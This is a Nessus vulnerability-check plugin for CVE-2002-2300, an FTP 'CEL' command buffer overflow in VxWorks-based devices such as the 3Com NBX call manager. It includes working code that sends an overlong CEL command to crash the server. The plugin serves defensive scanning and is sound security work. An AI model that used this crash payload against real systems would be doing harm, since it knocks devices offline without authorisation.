#
# This script derived from aix_ftpd by Michael Scheidell at SECNAP
#
# original script  written by Renaud Deraison <deraison@cvs.nessus.org>
# 
# See the Nessus Scripts License for details
#
# References:
# From: "Michael S. Scheidell" <Scheidell@secnap.com>
# Subject: [VU#317417] Denial of Service condition in vxworks ftpd/3com nbx
# To: "BugTraq" <bugtraq@securityfocus.com>, <security@windriver.com>,
#    <support@windriver.com>
# Date: Mon, 2 Dec 2002 13:04:31 -0500
#


include("compat.inc");

if(description)
{
 script_id(11184);
 script_version("$Revision: 1.16 $");

 script_cve_id("CVE-2002-2300");
 script_bugtraq_id(6297, 7480);
 script_xref(name:"OSVDB", value:"13576");
 script_xref(name:"OSVDB", value:"17618");
 
 script_name(english:"3Com NBX ftpd CEL Command Remote Overflow (2)");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote FTP server is affected by a buffer overflow vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote FTP server appears to be affected by a buffer overflow that
can be triggered with an overly-long 'CEL' command.  This problem is
similar to the 'aix ftpd' overflow but on embedded VxWorks-based
systems like the 3Com NBX IP phone call manager and seems to cause the
server to crash.  It is known to affected VxWorks ftpd versions
between 5.4 and 5.4.2." );
 script_set_attribute(attribute:"see_also", value:"http://www.secnap.net/security/nbx001.html" );
 script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/bugtraq/2003-04/0340.html" );
 script_set_attribute(attribute:"solution", value:
"If you are using an embedded VxWorks product, please contact the OEM
vendor and reference WindRiver field patch TSR 296292.  If this is the
3Com NBX IP Phone call manager, contact 3Com." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
script_end_attributes();


 script_summary(english:"Tries to CRASH VxWorks ftpd server with CEL overflow");
 script_category(ACT_KILL_HOST);
 script_family(english:"FTP");

 
 script_copyright(english:"This script is Copyright (C) 2002-2009 Michael Scheidell");
		  
 script_dependencie("find_service1.nasl",
	"ftpserver_detect_type_nd_version.nasl");
 script_require_ports("Services/ftp", 21);
 script_require_keys("ftp/vxftpd", "Settings/ParanoidReport");
 exit(0);
}

#
# The script code starts here : 
#

include("global_settings.inc");
include("ftp_func.inc");

if (report_paranoia < 2) exit(0);

port = get_kb_item("Services/ftp");
if(!port)port = 21;
if(!get_port_state(port))exit(0);

soc = open_sock_tcp(port);
if(soc)
{
  buf = ftp_recv_line(socket:soc);
  if(!buf){
 	close(soc);
	exit(0);
	}
  start_denial();
  
  buf = string("CEL a\r\n");
  send(socket:soc, data:buf);
  r = recv_line(socket:soc, length:1024);
  if(!r)exit(0);
  
  buf = string("CEL ", crap(2048), "\r\n");
  send(socket:soc, data:buf);
  b = recv_line(socket:soc, length:1024);
  ftp_close(socket: soc);
  alive = end_denial();
  if(!b)security_hole(port);
  if(!alive)set_kb_item(name:"Host/dead", value:TRUE);
}

